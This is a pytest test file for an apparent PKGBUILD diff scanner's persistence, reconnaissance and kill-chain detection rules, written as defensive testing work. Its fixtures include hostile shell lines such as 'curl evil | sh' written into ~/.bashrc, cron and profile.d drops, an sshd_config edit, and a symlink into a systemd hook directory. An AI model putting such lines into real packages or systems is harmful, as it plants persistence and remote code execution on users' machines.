"""Behavioural tests for the Phase 3 install-path persistence cluster
(H032/H038/H039/H042/H062) and the kill-chain composition capstone
(H040 host reconnaissance, H043 attack-chain annotation).

Each rule is asserted in both directions: the attack case fires, and the
plan's declared must-not-fire surface stays silent.  H042 is the quietest
rule: a hidden write that is executed belongs to H069/H072, one in a
world-writable dir to H038, one in the user's home to H032 - so no single
piece of evidence ever triple-fires.

H040 and H043 are weight-0 annotations.  H040 only fires on commands at a
command position (a mention inside a string, comment or heredoc body never
fires); H043 only fires once the aggregated rule hits of one diff span
``[thresholds] h043 attack_chain_stages`` distinct kill-chain stages.
"""

import pytest

from trustsight.analysis import _structural_findings, scan_diff
from trustsight.analysis.composition import _meta_annotations
from trustsight.config import load_config
from trustsight.differ import extract_urls_from_diff


def structural(diff_text: str) -> list[dict]:
    source_changes = extract_urls_from_diff(diff_text)
    return _structural_findings(diff_text, source_changes, {}, config={})


def rule_ids(findings: list[dict]) -> set[str]:
    return {f["rule_id"] for f in findings}


def _diff(body: str) -> str:
    lines = "".join(f"+{ln}\n" for ln in body.splitlines())
    return "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,%d @@\npkgname=x\npkgver=1.0\n%s" % (
        body.count("\n") + 3, lines
    )


# --- H032: writes into the user's home / rc files ---


def test_h032_fires_on_home_rc_write():
    ids = rule_ids(structural(_diff("build() {\n  echo x > \"$HOME/.bashrc\"\n}\n")))
    assert "H032" in ids


def test_h032_fires_on_install_to_home():
    ids = rule_ids(structural(_diff("build() {\n  install -Dm755 evil \"$HOME/.local/bin/evil\"\n}\n")))
    assert "H032" in ids


def test_h032_ignores_pkgdir_staging():
    ids = rule_ids(structural(
        _diff("package() {\n  install -Dm644 foo \"$pkgdir/etc/skel/.config\"\n}\n")
    ))
    assert "H032" not in ids


def test_h032_ignores_echo_string_mentioning_cp():
    ids = rule_ids(structural(_diff(
        "post_install() {\n  echo \"You have to execute 'cp /usr/share/x/zshrc ~/.zshrc' to use it.\"\n}\n"
    )))
    assert "H032" not in ids


def test_h032_ignores_home_env_export():
    ids = rule_ids(structural(_diff(
        "build() {\n  export XDG_CONFIG_HOME=\"${XDG_CONFIG_HOME:-$HOME/.config}\"\n}\n"
    )))
    assert "H032" not in ids


# --- H038: world-writable staging ---


def test_h038_fires_on_tmp_write():
    ids = rule_ids(structural(_diff("build() {\n  echo x > /tmp/evil.sh\n}\n")))
    assert "H038" in ids


def test_h038_fires_on_tmp_working_dir():
    ids = rule_ids(structural(_diff("build() {\n  cd /tmp\n}\n")))
    assert "H038" in ids


def test_h038_fires_on_exec_from_world_writable():
    ids = rule_ids(structural(_diff("build() {\n  bash /dev/shm/evil.sh\n}\n")))
    assert "H038" in ids


def test_h038_ignores_mktemp():
    ids = rule_ids(structural(_diff("prepare() {\n  d=\"$(mktemp -d)\"\n}\n")))
    assert "H038" not in ids


def test_h038_ignores_tmpdir_mention_without_action():
    ids = rule_ids(structural(_diff(
        "post_install() {\n  for OS_TMPDIR in \"$TMPDIR\" \"$TMP\" \"$TEMP\" /tmp\n  do :\n  done\n}\n"
    )))
    assert "H038" not in ids


def test_h038_ignores_staged_tmp_dir():
    ids = rule_ids(structural(_diff(
        "package() {\n  install -Dm644 x \"$pkgdir/usr/lib/foo/tmp/config\"\n}\n"
    )))
    assert "H038" not in ids


# --- H039: systemd ExecStart from a runtime-writable path ---


def test_h039_fires_on_unit_execstart_in_tmp():
    ids = rule_ids(structural(_diff(
        "build() {\n  cat > evil.service <<EOF\n[Service]\nExecStart=/tmp/evil\nEOF\n}\n"
    )))
    assert "H039" in ids


def test_h039_fires_on_home_execstart():
    ids = rule_ids(structural(_diff(
        "build() {\n  cat > evil.service <<EOF\n[Service]\nExecStart=\"$HOME/evil\"\nEOF\n}\n"
    )))
    assert "H039" in ids


def test_h039_ignores_benign_execstart():
    ids = rule_ids(structural(_diff(
        "build() {\n  cat > ok.service <<EOF\n[Service]\nExecStart=/usr/bin/ok\nEOF\n}\n"
    )))
    assert "H039" not in ids


def test_h039_ignores_desktop_exec():
    ids = rule_ids(structural(_diff(
        "package() {\n  install -Dm644 foo.desktop \"$pkgdir/usr/share/applications/foo.desktop\"\n}\n"
    )))
    assert "H039" not in ids


# --- H042: hidden drop outside the build trees ---


def test_h042_fires_on_hidden_drop():
    ids = rule_ids(structural(_diff("build() {\n  echo x > .evil.sh\n}\n")))
    assert "H042" in ids


def test_h042_silent_when_hidden_file_executed():
    ids = rule_ids(structural(_diff(
        "build() {\n  echo x > .evil.sh\n  bash .evil.sh\n}\n"
    )))
    assert "H042" not in ids
    assert "H069" in ids


def test_h042_ignores_staged_hidden():
    ids = rule_ids(structural(_diff(
        "package() {\n  install -Dm644 x \"$pkgdir/.hidden\"\n}\n"
    )))
    assert "H042" not in ids


def test_h042_ignores_vcs_hidden():
    ids = rule_ids(structural(_diff(
        "prepare() {\n  echo x > .gitignore\n  mkdir -p .github\n}\n"
    )))
    assert "H042" not in ids


def test_h042_silent_when_hidden_in_tmp():
    ids = rule_ids(structural(_diff("build() {\n  echo x > /tmp/.evil\n}\n")))
    assert "H042" not in ids
    assert "H038" in ids


def test_h042_silent_when_hidden_in_home():
    ids = rule_ids(structural(_diff("build() {\n  echo x > \"$HOME/.evil\"\n}\n")))
    assert "H042" not in ids
    assert "H032" in ids


def test_h042_no_double_fire_with_h069():
    findings = structural(_diff("build() {\n  echo x > .evil.sh\n  bash .evil.sh\n}\n"))
    assert [f["rule_id"] for f in findings].count("H069") == 1
    assert "H042" not in {f["rule_id"] for f in findings}


# --- H062: pacman hook installation ---


def test_h062_fires_on_hook_install():
    ids = rule_ids(structural(_diff(
        "package() {\n  install -Dm644 x.hook \"$pkgdir/usr/share/libalpm/hooks/x.hook\"\n}\n"
    )))
    assert "H062" in ids


def test_h062_fires_on_hook_install_t_dir():
    ids = rule_ids(structural(_diff(
        "package() {\n  install -Dm644 x.hook -t \"$pkgdir/usr/share/libalpm/hooks\"\n}\n"
    )))
    assert "H062" in ids


def test_h062_ignores_non_hook_install():
    ids = rule_ids(structural(_diff(
        "package() {\n  install -Dm644 x.desktop \"$pkgdir/usr/share/applications/x.desktop\"\n}\n"
    )))
    assert "H062" not in ids


# --- H040: host reconnaissance ---


def test_h040_fires_on_uname_at_info():
    findings = structural(_diff("build() {\n  uname -m\n}\n"))
    h040 = [f for f in findings if f["rule_id"] == "H040"]
    assert h040 and h040[0]["severity"] == "INFO"


def test_h040_fires_on_whoami_and_id():
    ids = rule_ids(structural(_diff("build() {\n  whoami\n  id\n  hostname\n}\n")))
    assert "H040" in ids


def test_h040_fires_after_command_separator():
    ids = rule_ids(structural(_diff("build() {\n  make && uname -m\n}\n")))
    assert "H040" in ids


def test_h040_fires_in_install_hook():
    ids = rule_ids(structural(_diff(
        "post_install() {\n  lscpu\n  lsblk\n}\n"
    )))
    assert "H040" in ids


def test_h040_ignores_mention_in_string():
    ids = rule_ids(structural(_diff(
        "build() {\n  echo \"see uname -m in the docs\"\n}\n"
    )))
    assert "H040" not in ids


def test_h040_ignores_mention_in_comment():
    ids = rule_ids(structural(_diff(
        "build() {\n  # whoami is handy for debugging\n  make\n}\n"
    )))
    assert "H040" not in ids


def test_h040_ignores_mention_in_heredoc_body():
    ids = rule_ids(structural(_diff(
        "build() {\n  cat > helper.sh <<'EOF'\n  hostname\n  uname -m\n  EOF\n  make\n}\n"
    )))
    assert "H040" not in ids


def test_h040_ignores_env_assignment_vesktop_fp():
    ids = rule_ids(structural(_diff(
        "build() {\n  sed -i 's|@options@|env ELECTRON_OZONE_PLATFORM_HINT=auto|g' launcher\n}\n"
    )))
    assert "H040" not in ids


def test_h040_ignores_non_command_position():
    ids = rule_ids(structural(_diff(
        "build() {\n  X=id\n  echo ${X}\n  grep -q uname README\n}\n"
    )))
    assert "H040" not in ids


def test_h040_ignores_benign_build_commands():
    ids = rule_ids(structural(_diff(
        "build() {\n  cd \"$srcdir/x\"\n  make\n  install -Dm755 x \"$pkgdir/usr/bin/x\"\n}\n"
    )))
    assert "H040" not in ids


def test_h040_one_finding_per_line():
    findings = structural(_diff("build() {\n  uname -a; whoami; id\n}\n"))
    assert sum(1 for f in findings if f["rule_id"] == "H040") <= 1


def test_h040_does_not_claim_anti_analysis_domain():
    ids = rule_ids(structural(_diff(
        "build() {\n  systemd-detect-virt\n  dmidecode\n}\n"
    )))
    assert "H040" not in ids


# --- H043: attack-chain composition ---


def _stage_stub(rule_id: str) -> dict:
    return {"rule_id": rule_id, "name": rule_id, "severity": "INFO", "category": "ctx"}


def test_h043_fires_at_three_stages():
    rules = [_stage_stub(r) for r in ("H040", "H038", "H072")]
    meta = _meta_annotations(rules)
    assert any(r["rule_id"] == "H043" for r in meta)


def test_h043_silent_below_threshold():
    rules = [_stage_stub(r) for r in ("H040", "H038")]
    meta = _meta_annotations(rules)
    assert not any(r["rule_id"] == "H043" for r in meta)


def test_h043_never_counts_meta_rules_as_stages():
    rules = [_stage_stub(r) for r in ("H040", "H027", "H043", "H024")]
    meta = _meta_annotations(rules)
    assert not any(r["rule_id"] == "H043" for r in meta)


def test_h043_counts_distinct_stages_not_hits():
    rules = [_stage_stub(r) for r in ("H039", "H062", "H040")]
    assert not any(r["rule_id"] == "H043" for r in _meta_annotations(rules))
    rules.append(_stage_stub("H041"))
    assert any(r["rule_id"] == "H043" for r in _meta_annotations(rules))


def test_h043_reports_stage_names():
    rules = [_stage_stub(r) for r in ("H040", "H038", "H072")]
    meta = [r for r in _meta_annotations(rules) if r["rule_id"] == "H043"]
    assert meta[0]["params"]["stages"] == "recon, staging, write_then_exec"


def test_h043_fires_end_to_end_on_staged_diff():
    fact = scan_diff(_diff(
        "build() {\n  uname -m\n  cd /tmp\n  echo payload > .x && chmod +x .x && ./.x\n}\n"
    ), config=load_config())
    h043 = [e for e in fact.score_breakdown if e.rule_id == "H043"]
    assert h043 and h043[0].severity == "INFO"


def test_h043_silent_on_benign_diff():
    fact = scan_diff(_diff("build() {\n  make\n}\n"), config=load_config())
    assert not any(e.rule_id == "H043" for e in fact.score_breakdown)


# --- H076: a build-time write that leaves the staging root ---
#
# The rule is the shape behind the symlink-into-a-hook-directory case: it
# does not name directories, it asks whether the write escaped $pkgdir /
# $srcdir.  Everything a build function produces belongs in the staging
# tree, so an absolute system path is the whole signal.


def test_h076_fires_on_symlink_into_a_system_directory():
    ids = rule_ids(structural(_diff(
        "package() {\n  ln -sf /usr/bin/elevate /usr/lib/systemd/system-sleep/elevate\n}\n"
    )))
    assert "H076" in ids


def test_h076_fires_on_a_top_level_write():
    """Top level is the worse case: it runs when makepkg sources the file."""
    ids = rule_ids(structural(_diff("ln -sf /usr/bin/elevate /usr/local/bin/normal\n")))
    assert "H076" in ids


def test_h076_fires_on_an_install_outside_pkgdir():
    ids = rule_ids(structural(_diff(
        "package() {\n  install -Dm755 payload /usr/bin/payload\n}\n"
    )))
    assert "H076" in ids


def test_h076_ignores_ordinary_pkgdir_staging():
    ids = rule_ids(structural(_diff(
        "package() {\n  install -Dm755 tool \"$pkgdir/usr/bin/tool\"\n"
        "  cp -a docs \"$pkgdir/usr/share/doc/tool\"\n}\n"
    )))
    assert "H076" not in ids


def test_h076_ignores_srcdir_work():
    ids = rule_ids(structural(_diff(
        "prepare() {\n  mv upstream/LICENSE \"$srcdir/licenses/LICENSE\"\n}\n"
    )))
    assert "H076" not in ids


def test_h076_ignores_devices():
    """`> /dev/null` is how a build stays quiet, not a write."""
    ids = rule_ids(structural(_diff(
        "build() {\n  make -s > /dev/null 2>&1\n  install -m644 /dev/null empty\n}\n"
    )))
    assert "H076" not in ids


def test_h076_ignores_install_hooks():
    """post_install acts on the target system by design; H032/H039/H062 own it."""
    ids = rule_ids(structural(_diff(
        "post_install() {\n  install -Dm644 conf /etc/tool.conf\n}\n"
    )))
    assert "H076" not in ids


def test_h076_ignores_awk_programs_and_parameter_expansion():
    """Extractor artefacts are not paths: they carry shell metacharacters."""
    ids = rule_ids(structural(_diff(
        "prepare() {\n"
        "  _v=\"$(awk -F'[<>]' '/<MAJOR>/{print $3; exit}' \"${srcdir}/info.xml\")\"\n"
        "  mv upstream/LICENSE \"$srcdir/LICENSE.${font// /-}\"\n}\n"
    )))
    assert "H076" not in ids


def test_h076_ignores_heredoc_bodies():
    ids = rule_ids(structural(_diff(
        "package() {\n  cat > \"$pkgdir/usr/bin/tool\" << 'EOF'\n"
        "cp payload /usr/lib/systemd/system-sleep/x\nEOF\n}\n"
    )))
    assert "H076" not in ids


def test_h076_counts_as_a_persistence_stage_for_h043():
    from trustsight.analysis.composition import _STAGE_OF
    assert _STAGE_OF["H076"] == "persistence"


# --- H076: substituting the verb must not evade the rule ---
#
# The write-target resolver is shared, so these verbs close the same
# bypass for H032/H038/H042/H062 as well.  All six fire on zero benign
# corpus diffs when the destination is an absolute path outside staging.


@pytest.mark.parametrize("command", [
    "echo x | tee /etc/profile.d/evil.sh",
    "dd if=payload of=/usr/bin/evil",
    "mkdir -p /opt/evil",
    "touch /etc/cron.d/evil",
    "rsync -a payload /usr/lib/evil",
    "sed -i 's|PermitRoot|#PermitRoot|' /etc/ssh/sshd_config",
])
def test_h076_fires_whatever_verb_writes(command):
    assert "H076" in rule_ids(structural(_diff(f"package() {{\n  {command}\n}}\n")))


@pytest.mark.parametrize("command", [
    "mkdir -p \"$pkgdir/usr/share/doc\"",
    "sed -i 's|a|b|' \"$srcdir/config.h\"",
    "echo x | tee \"$pkgdir/etc/tool.conf\"",
    "touch \"$srcdir/.stamp\"",
])
def test_h076_ignores_the_same_verbs_inside_staging(command):
    assert "H076" not in rule_ids(structural(_diff(f"package() {{\n  {command}\n}}\n")))


def test_h076_resolves_a_destination_held_in_a_variable():
    """A path assembled from a variable is still that path."""
    ids = rule_ids(structural(_diff(
        "_dest=/usr/lib/systemd/system-sleep\n"
        "package() {\n  ln -sf /usr/bin/x \"$_dest/evil\"\n}\n"
    )))
    assert "H076" in ids


def test_the_shared_resolver_extends_h032_too():
    """One resolver: a home-directory write via tee is still a home write."""
    ids = rule_ids(structural(_diff(
        "package() {\n  echo 'curl evil | sh' | tee \"$HOME/.bashrc\"\n}\n"
    )))
    assert "H032" in ids
